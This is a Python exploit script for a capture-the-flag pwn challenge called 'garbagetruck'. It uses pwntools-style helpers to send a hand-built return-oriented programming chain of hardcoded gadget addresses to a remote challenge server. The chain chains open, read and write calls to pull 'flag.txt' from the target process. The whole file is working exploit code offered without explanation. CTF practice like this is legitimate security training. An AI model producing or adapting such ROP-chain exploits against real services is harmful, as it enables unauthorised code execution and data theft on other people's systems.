#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './garbagetruck_04bfbdf89b37bf5ac5913a3426994185b4002d65'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'garbagetruck.chal.pwning.xxx', 'port':6349})
env.select()

#==========

binf = ELF(bin_file)
addr_plt_open       = binf.plt['open']
addr_plt_read       = binf.plt['read']
addr_plt_write      = binf.plt['write']
addr_bss            = binf.sep_section['.bss']

addr_r15            = 0x00403dc9
addr_r14            = 0x00406eef
addr_rbx            = 0x00402659
addr_rdi            = 0x00403043
addr_rsi_r15        = 0x0040a8d9
addr_rbp            = 0x00404bf9
addr_rsi            = 0x00406afb

addr_add_ecx_ebp    = 0x00453a87
addr_push_rcx_ret   = 0x0050ba3f        # push rcx ; cdq  ; ret

addr_gadget1        = 0x0040540d        # mov rax, rbx ; pop rbx ; ret
addr_gadget2        = 0x00486b2f        # mov rcx, rbx ; mov esi, 0x00000001 ; mov rdi, r12 ; call rax
addr_gadget3        = 0x0045a33d        # add rcx, qword [rsp+0x28] ; imul rbx, rbp ; mov rsi, rcx ; mov qword [rsp+0x20], rcx ; call r15
addr_gadget4        = 0x004380c5        # and bl, al ; nop word [rax+rax+0x00000000] ; mov qword [rdi], rsi ; ret
addr_gadget5        = 0x004215a1        # add esi, ebx ; stosq  ; mov eax, 0x00000001 ; pop rbx ; ret
addr_gadget6        = 0x0044b829        # nop dword [rax+0x00000000] ; xor edi, edi ; mov rax, rdi ; ret

#==========

def attack(conn):
    for _ in range(0x1b):
        conn.sendlineafter('> ', str(0xdeadbedf))

    gadgets  = [addr_r15]
    gadgets += [addr_r14]
    gadgets += [addr_rbx]
    gadgets += [addr_r14]
    gadgets += [addr_gadget1]
    gadgets += [u64('flag.txt') - 0x11]
    gadgets += [addr_gadget2]
    gadgets += [addr_gadget3]
    gadgets += [addr_rdi]
    gadgets += [addr_bss + 0x39]
    gadgets += [addr_gadget4]
    gadgets += [addr_rsi_r15]
    gadgets += [0xdeadbedf]
    gadgets += [0x11]
    gadgets += [addr_rbx]
    gadgets += [addr_plt_open - 0x2d]
    gadgets += [addr_gadget2]
    gadgets += [addr_rbp]
    gadgets += [0x2b]
    gadgets += [addr_add_ecx_ebp]
    gadgets += [addr_rbp]
    gadgets += [0x2]
    gadgets += [addr_add_ecx_ebp]
    gadgets += [addr_rdi]
    gadgets += [addr_bss + 0x51]
    gadgets += [addr_rbx]
    gadgets += [0xfffffffb]
    gadgets += [addr_gadget5]
    gadgets += [0x2]
    gadgets += [addr_gadget5]
    gadgets += [0x2]
    gadgets += [addr_gadget5]
    gadgets += [0xdeadbedf]
    gadgets += [addr_rdi]
    gadgets += [addr_bss + 0x39]
    gadgets += [addr_push_rcx_ret]

    gadgets += [addr_rbx]
    gadgets += [addr_r14]
    gadgets += [addr_gadget1]
    gadgets += [addr_plt_read - 0x7]
    gadgets += [addr_gadget2]
    gadgets += [addr_rbp]
    gadgets += [0x7]
    gadgets += [addr_add_ecx_ebp]
    gadgets += [addr_gadget6]
    gadgets += [addr_rsi]
    gadgets += [addr_bss + 0x39]
    gadgets += [addr_rbx]
    gadgets += [0xffffffffffffffc5]
    gadgets += [addr_gadget1]
    gadgets += [0xdeadbedf]
    gadgets += [addr_push_rcx_ret]

    gadgets += [addr_rbx]
    gadgets += [addr_r14]
    gadgets += [addr_gadget1]
    gadgets += [addr_plt_write - 0x1d]
    gadgets += [addr_gadget2]
    gadgets += [addr_rbp]
    gadgets += [0x1d]
    gadgets += [addr_add_ecx_ebp]
    gadgets += [addr_rdi]
    gadgets += [2]
    gadgets += [addr_rsi]
    gadgets += [addr_bss + 0x39]
    gadgets += [addr_rbx]
    gadgets += [0xffffffffffffffc5]
    gadgets += [addr_gadget1]
    gadgets += [0xdeadbedf]
    gadgets += [addr_push_rcx_ret]
    
    for v in gadgets:
        conn.sendlineafter('> ', str(v))

    conn.sendlineafter('> ', str(0))

    conn.recvuntil('like:')
    conn.recvuntil('\n')
    print conn.recvuntil('\n')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    
#==========
